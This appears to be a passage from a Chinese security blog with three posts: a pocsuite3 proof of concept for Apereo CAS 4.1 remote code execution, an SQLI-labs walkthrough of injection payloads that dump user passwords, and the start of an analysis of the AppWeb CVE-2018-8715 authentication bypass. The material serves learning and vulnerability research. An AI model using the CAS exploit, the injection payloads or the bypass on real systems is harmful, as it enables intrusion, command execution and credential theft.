<h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">from collections import OrderedDict</span><br><span class="line">from pocsuite3.api import Output, POCBase, OptString, register_poc, requests</span><br><span class="line"></span><br><span class="line">class ApereoPoc(POCBase):</span><br><span class="line">	vulID &#x3D; &#39;004&#39;</span><br><span class="line">	version &#x3D; &#39;1.0&#39;</span><br><span class="line">	author &#x3D; [&#39;ol4three&#39;]</span><br><span class="line">	vulDate &#x3D; &#39;2020-12-29&#39;</span><br><span class="line">	updateDate &#x3D; &#39;2020-12-29&#39;</span><br><span class="line">	references &#x3D; [&#39;https:&#x2F;&#x2F;github.com&#x2F;MrMeizhi&#x2F;ysoserial-mangguogan&#39;]</span><br><span class="line">	name &#x3D; &#39;appereo 4.1rce&#39;</span><br><span class="line">	appPowerLink &#x3D; &#39;https:&#x2F;&#x2F;www.appareo.com&#x2F;&#39;</span><br><span class="line">	appName &#x3D; &#39;Appereo&#39;</span><br><span class="line">	appVersion &#x3D; &#39;4.1&#39;</span><br><span class="line">	vulType &#x3D; &#39;rce&#39;</span><br><span class="line">	desc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> 			rce</span><br><span class="line"> 			&#39;&#39;&#39;</span><br><span class="line">	pocDesc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> 	pocsuite -r ***.py -u target --verify&quot;</span><br><span class="line"> 	&#39;&#39;&#39;</span><br><span class="line">	samples &#x3D; []</span><br><span class="line">	install_requires &#x3D; []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	def _options(self):</span><br><span class="line">		o &#x3D; OrderedDict()</span><br><span class="line">		o[&quot;exec&quot;] &#x3D; OptString(&#39;&#39;, description&#x3D;&#39;请输入想要执行的命令&#39;, require&#x3D;True)</span><br><span class="line">		return o</span><br><span class="line"></span><br><span class="line">	def _verify(self):</span><br><span class="line">		result &#x3D; &#123;&#125;</span><br><span class="line">		payload &#x3D; self.get_option(&quot;exec&quot;)</span><br><span class="line">		url &#x3D; self.url + &#39;&#x2F;cas&#x2F;login&#39;</span><br><span class="line">		headers&#x3D;&#123;</span><br><span class="line">			&#39;Content-Type&#39;:  &#39;application&#x2F;x-www-form-urlencoded&#39;,</span><br><span class="line">			&#39;cmd&#39;: payload</span><br><span class="line">		&#125;</span><br><span class="line">		#proxies&#x3D;&#123;</span><br><span class="line">		# &#39;http&#39;:&#39;127.0.0.1:8081&#39;,</span><br><span class="line">		# &#39;https&#39;:&#39;127.0.0.1:8081&#39;</span><br><span class="line">		# &#125;</span><br><span class="line">		data &#x3D; &#123;</span><br><span class="line">			&#39;execution&#39;:&#39;4c2e04cc-36fd-4a78-a539-ab98a65ff427_AAAAIgAAABC0ugdUC3wVTL66CTpSSFXfAAAABmFlczEyOCCbvgOC7&#x2F;mJ16k1YEqnbb4iYkkhNuWylo+cCiG7vsHQWc4OudDgqLtgaCEzQj8c&#x2F;3tWkVDKryIJFcjdW64IpJ1+ymxDamhIfoF3oCFkBD6LGjmB31YH6zlT1rFN9&#x2F;7CFeKORHALeLVx2YAN4seko9M&#x2F;javUOs7UE+zzLGonjc54xjK7S64KBw52Fa0vj912zrOP4J6S7Vi9yJOeOTx432Or&#x2F;cjz722nEAIpjpcIIawwRdUcCyZY7bJDhR+QL7Ca3h9lPZ1LIAeIe9CDP0PCQDAONZ0rswQ9AitIDlqM+lBDKtqhPfHSNq8jBd5T6t3&#x2F;9xXFpPIbLpUPiwysE&#x2F;yioU8b&#x2F;npQfATy5UZvf3d2TWtHiEEhECGjOS4zZqqhl5HhBK3lw50JoO&#x2F;78RMscuM+3oAF8r9YJq2vrY+2GNwgg5rMIWtodeQL9gEIABKMy2Isetinvnc05Dj5f9kJ7WXSIrEobqYmSf1RaSM7EO8yuXS7kVUvY1+TYBorC8JYhY6owsUm4jNSKlvVX+PkrwcQXOJH3lpVpN4qZ&#x2F;GTNJkNO0ndWRlWgoHDKxI0+Jr6+k2CzlPgOhCiQq08nldByD4VOFJ1Fcjj4XFxlWI2MWxsMYTj9YdHwozA4gZNE8gkMq0tn8lwnJz6gVvSXWkDKnxJBPT3kEw1b+wjZSBsuj+JCdxCIa+lZopdPWIO40ITA2245p1U9i9srkCJ&#x2F;od122lzrrCALs+FKn1&#x2F;uwQs9FKXxH8xKwgpUmZepCX6Lf+qr8m9xQ&#x2F;XmoxSh1Sg0hkZcw0bh30mdZvUH9Jf&#x2F;bEdgVxuAB1Ki1Y5&#x2F;flDS4HkjydACMm+Pg5SzcRHZtavv+t5ko&#x2F;tTIjwyqug9jOZWMnKDq47nD&#x2F;qOvuO0TS&#x2F;COeDMmPGV4stx6+5+6kXtP088MQVRBLdlVsGrolnPVgQG9JPgfMOZKoyidBDH99oy1WWivT2Y2LDnFx4MXeuEHR3qnuWHkYxfaysVCM83yMd4eqvLBHp4ILBf4mmv34S25T7ajkOKfIDXJZc7AhzlkfPzufCSIVdYNPvRxijLpJV2icYs7KQXx98EXXwOAw+wXJAKEbEXv&#x2F;gErjwUQUXVactxFVqlkugxj1u052N9gh620Nz+54c5FF8vHaBtHVNtB48bnB1NGCL098EDHFnI9L&#x2F;trqp2LPw6veXtH0y6TT&#x2F;l+sALyQ6P167qrc6lQ8gclh5tEg4Cuz2jbG56pmY+5Zj6RHNFeZeDDXpYrJ5g2Bxn4AcPW3lM4Vpnzoypzcs4ktZRL0deQNMis53i5O0C96ZBQjYqfPqCtr7zS7KZXRfJSmmv0hcWZINv0S2+7SzFCrRyMW0ykJ4reuwlm1ZAG2W5RZNzMOH&#x2F;76N2ITAQxFHG228typOvHAuXG2pB5xYMwtm9ZysqQvzGNMspuu0CaDkCV7myKMAtCfGJTVRV7xs1slSmYnwTg3SdoJ+0ZJfOOsyFsZYqii2RTixQKykc4Uo3fyLb9dFe6Kd7vpkK&#x2F;47MrOmzVBS1Xv1cHGCeM7K4Yca0&#x2F;oJL&#x2F;Dhbwfqt4hIKbhiTccek5mco&#x2F;hywqizyY2C3UVieQxOX1CYfrjnihEJ75lBQjkaRqB3S05vzzfyTPvv55QfYQMyMODdgvNEt9PIQ6axHv1DxYeVhUAd10p1n01SQIdbAi+1WE3ykGgyrLSul1gFRlI&#x2F;3STqelXFWbYiZarKdfgvvV1r&#x2F;HQ6ZErUagAdmmaJUSgjzRSEgA3Sk&#x2F;V5PMrISxxYVbTVm&#x2F;vq1Zla7BaUstxiclygOuvZ3C2AfxS+AVaTeqOWCqXrjeg6uxOJIUQ1HzS&#x2F;Vs5EbYmkcRHWCjJRTjh&#x2F;Sa0GDP&#x2F;Giuw5CL8BEDo7SKuYqVYOIf5hk0Upj4YcRWouOhbbJY9mNNWHknoiYRJHTrVDrRwYYO1Ij8Vf8jiWmXxRWZ8tyFuEB3yX0SkVgw5OlU1M24d7x1LZYpZX6vpU1qrDme1yrGW4FS4qBg3lE1r9EK2gzQeT1u5GhME2rotGVNU4OZ&#x2F;Ut3mKpY5NOo3b2yHoa1iIdE+Sg9uerfNPV59u00En&#x2F;I2MHTtl8JGZp3SXTtoxG8YBC4CU7JXdSzmSF8nHD0SGUL&#x2F;LNdajIzH9hfijUX6I5NxEMyumX&#x2F;krUBqW0irEWYV7I60YDRzN&#x2F;LpXe9EQj5chLmXlRcQU49vlxSHav3YFHrnGFFzyGxwU&#x2F;6RDiWIt4ombAl&#x2F;&#x2F;OsWR964unMMsU+omndBNBII&#x2F;1g1kSs1qikjqdNm611p8swjK3X7kpGCj5rUyTE9GOAkBD6NYrj32SNE5BPys7u6r3Q7gx&#x2F;hU1s02trClHoQhqQvKILW8dN7aYcWSf5FV8fug3GjAxV+c3pTYiNbe2lKFLbzyeJen1GvkAVXVrpJqtuPejZK6IPiJ8wI7ZwqL7oP5G3Esu9Z6syxrdqMGmhpOA0QE0NPISgMu6TzZxgt3FGAkV9&#x2F;hH9ABc&#x2F;h4QMMkUOgZPMddyYBugpcaG0NTgU7WXZNuz1hQEqsW+rcXVhF30uydTnF2mhJ0UrmQVMg+qlaGBQOVJuar9ud+D+CAYT2a2tjUluhWj284EjM5yNg3A5nNQthCowUy7bfsjbp82Yb8p9l86ETHZo26WmUe2k+beZPGOtF00QZcQaRYowr2B8+0OMFuhmGzWtJqlWgGXAmtcWFPyDgnHWwjj&#x2F;bTyqzVfnrBpiKf1SiUdRbrvyr8hjrWQ&#x2F;wZ52No1qkQmLo1x9sfEcBKHOxakYWb6vjbcPQekorRn4NS4WT3KU&#x2F;ftAhxg2EITy2Lq1Y&#x3D;&#39;</span><br><span class="line">			&#125;</span><br><span class="line">		r &#x3D; requests.post(url, headers&#x3D;headers,data&#x3D;data)</span><br><span class="line">		if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">			result[&#39;VerifyInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line">			result[&#39;VerifyInfo&#39;][&#39;URL&#39;] &#x3D; url</span><br><span class="line">			result[&#39;VerifyInfo&#39;][&#39;exec&#39;] &#x3D; r.text</span><br><span class="line">		return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">	def parse_output(self, result):</span><br><span class="line"> 		output &#x3D; Output(self)</span><br><span class="line"> 		if result:</span><br><span class="line"> 			output.success(result)</span><br><span class="line"> 		else:</span><br><span class="line"> 			output.fail(&#39;target is not vulnerable&#39;)</span><br><span class="line"> 		return output</span><br><span class="line"></span><br><span class="line">	def _attack(self):</span><br><span class="line">		return self._verify()</span><br><span class="line">register_poc(ApereoPoc)</span><br></pre></td></tr></table></figure>



<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229210459731.png" alt="image-20201229210459731"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8260#toc-4">https://xz.aliyun.com/t/8260#toc-4</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/MrMeizhi/ysoserial-mangguogan">https://github.com/MrMeizhi/ysoserial-mangguogan</a></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/Apereo-Cas/">Apereo Cas </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/12/23/WEB/SQLI-labs-%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"><i class="fas fa-angle-double-right"></i>SQLI labs 靶场学习记录</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-12-23</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-25T08:35:11.341Z" title="2020-12-25T08:35:11.341Z">2020-12-25</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-25</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">4 minutes read (About 632 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/12/23/WEB/SQLI-labs-%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">SQLI labs 靶场学习记录</a></h1><div class="content"><h2 id="基础挑战1-20关"><a href="#基础挑战1-20关" class="headerlink" title="基础挑战1-20关"></a>基础挑战1-20关</h2><h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 3%23    &#x2F;&#x2F;得到列数为3</span><br><span class="line">-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata%23  &#x2F;&#x2F;得到数据库名</span><br><span class="line">-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D; &#39;security&#39;%23 &#x2F;&#x2F;得到表名</span><br><span class="line">-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D; &#39;users&#39;%23 &#x2F;&#x2F;得到列名</span><br><span class="line">-1&#39; union select 1,username,password from users where id&#x3D;3%23 &#x2F;&#x2F;爆破得到数据</span><br></pre></td></tr></table></figure>

<h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>

<h4 id="报错注入1"><a href="#报错注入1" class="headerlink" title="报错注入1"></a>报错注入1</h4><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+</span><br></pre></td></tr></table></figure>

<h4 id="报错注入2"><a href="#报错注入2" class="headerlink" title="报错注入2"></a>报错注入2</h4><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(username+AS+CHAR),0x27,0x7e)+FROM+users+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1&#x3D;1--+</span><br></pre></td></tr></table></figure>

<p>布尔盲注</p>
<p>数据库第一个字母为 <code>s</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and left(database(),1)&gt;&#39;r&#39;--+</span><br><span class="line">?id&#x3D;1&#39; and left(database(),1)&gt;&#39;s&#39;--+</span><br></pre></td></tr></table></figure>

<p>延时盲注</p>
<p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+</span><br><span class="line">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+</span><br></pre></td></tr></table></figure>

<p><strong>联合查询注入</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:80/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=U -v 3</span><br></pre></td></tr></table></figure>

<p><strong>报错注入</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:80/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=E -v 3</span><br></pre></td></tr></table></figure>

<p><strong>布尔盲注</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:80/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=B -v 3</span><br></pre></td></tr></table></figure>

<p><strong>延时盲注</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:80/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=T -v 3</span><br></pre></td></tr></table></figure>

<h3 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h3><p>在添加’后返回</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>可以得到这个sql语句其实并没有单引号，只是用数字进行查询，查看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br></pre></td></tr></table></figure>

<p>和less1一样 payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 or 1&#x3D;1%23</span><br><span class="line">?id&#x3D;-1+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>

<h3 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h3><p>添加’后返回</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;-1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>sql语句为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br></pre></td></tr></table></figure>

<p>所以我们需要闭合</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;) or 1&#x3D;1%23</span><br><span class="line">?id&#x3D;-1%27)+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>

<h3 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h3><p>添加’后为报错添加”后报错如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;-1&quot;&quot;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>sql语句为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br></pre></td></tr></table></figure>

<p>payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&quot;) or 1&#x3D;1%23</span><br><span class="line">?id&#x3D;-1&quot;)+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure>

<p>更新中…</p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-111">https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-111</a></p>
<p><a target="_blank" rel="noopener" href="http://blog.zeddyu.info/2019/03/03/Sqli-lab%E9%80%9F%E5%88%B7%E8%AE%B0%E5%BD%95(1-53)/">http://blog.zeddyu.info/2019/03/03/Sqli-lab%E9%80%9F%E5%88%B7%E8%AE%B0%E5%BD%95(1-53)/</a></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/SQLI-labs/">SQLI-labs </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/12/22/WEB/Exploit/AppWeb/AppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2018-8715/"><i class="fas fa-angle-double-right"></i>AppWeb认证绕过漏洞(CVE-2018-8715)</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-12-22</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:51:00.277Z" title="2020-12-23T08:51:00.277Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">9 minutes read (About 1330 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/12/22/WEB/Exploit/AppWeb/AppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2018-8715/">AppWeb认证绕过漏洞(CVE-2018-8715)</a></h1><div class="content"><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p>
</blockquote>
<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、basic 传统HTTP基础认证</span><br><span class="line"></span><br><span class="line">2、digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</span><br><span class="line"></span><br><span class="line">3、form 表单认证</span><br></pre></td></tr></table></figure>

<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为null（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接</p>
<p>认证成功，并返回session。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问页面如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222103500284.png" alt="image-20201222103500284"></p>
<p>构造的get数据包，加入我们构造的usename字段，注意用户名是已经存在的才可以进行构造</p>
<p>Authorization: Digest username=admin</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222104134406.png" alt="image-20201222104134406"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222104813555.png" alt="image-20201222104813555"></p>
<p>即可登陆成功</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参<br>数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
<p>漏洞位置在<a target="_blank" rel="noopener" href="https://github.com/embedthis/appweb/blob/v7.0.2/paks/http/dist/httpLib.c">appweb/paks/http/dist/httpLib.c 2</a></p>
<p>首先是<code>function authCondition()</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">    This condition is used to implement all user authentication for routes</span><br><span class="line"> *&#x2F;</span><br><span class="line">static int authCondition(HttpConn *conn, HttpRoute *route, HttpRouteOp *op)</span><br><span class="line">&#123;</span><br><span class="line">    HttpAuth    *auth;</span><br><span class="line">    cchar       *username, *password;</span><br><span class="line"></span><br><span class="line">    assert(conn);</span><br><span class="line">    assert(route);</span><br><span class="line"></span><br><span class="line">    auth &#x3D; route-&gt;auth;</span><br><span class="line">    if (!auth || !auth-&gt;type) &#123;</span><br><span class="line">        &#x2F;* Authentication not required *&#x2F;</span><br><span class="line">        return HTTP_ROUTE_OK;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!httpIsAuthenticated(conn)) &#123;</span><br><span class="line">        httpGetCredentials(conn, &amp;username, &amp;password);</span><br><span class="line">        if (!httpLogin(conn, username, password)) &#123;</span><br><span class="line">            if (!conn-&gt;tx-&gt;finalized) &#123;</span><br><span class="line">                if (auth &amp;&amp; auth-&gt;type) &#123;</span><br><span class="line">                    (auth-&gt;type-&gt;askLogin)(conn);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    httpError(conn, HTTP_CODE_UNAUTHORIZED, &quot;Access Denied, login required&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                &#x2F;* Request has been denied and a response generated. So OK to accept this route. *&#x2F;</span><br><span class="line">            &#125;</span><br><span class="line">            return HTTP_ROUTE_OK;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!httpCanUser(conn, NULL)) &#123;</span><br><span class="line">        httpTrace(conn, &quot;auth.check&quot;, &quot;error&quot;, &quot;msg:&#39;Access denied, user is not authorized for access&#39;&quot;);</span><br><span class="line">        if (!conn-&gt;tx-&gt;finalized) &#123;</span><br><span class="line">            httpError(conn, HTTP_CODE_FORBIDDEN, &quot;Access denied. User is not authorized for access.&quot;);</span><br><span class="line">            &#x2F;* Request has been denied and a response generated. So OK to accept this route. *&#x2F;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;* OK to accept route. This does not mean the request was authenticated - an error may have been already generated *&#x2F;</span><br><span class="line">    return HTTP_ROUTE_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数负责调用两个用于认证处理的函数：<code>getCredentials</code>和<code>httpLogin</code>，注意到<code>httpGetCredentials</code>周围缺少检查，这将会在稍后起到作用</p>
<p><code>httpGetCredentials()</code>:</p>
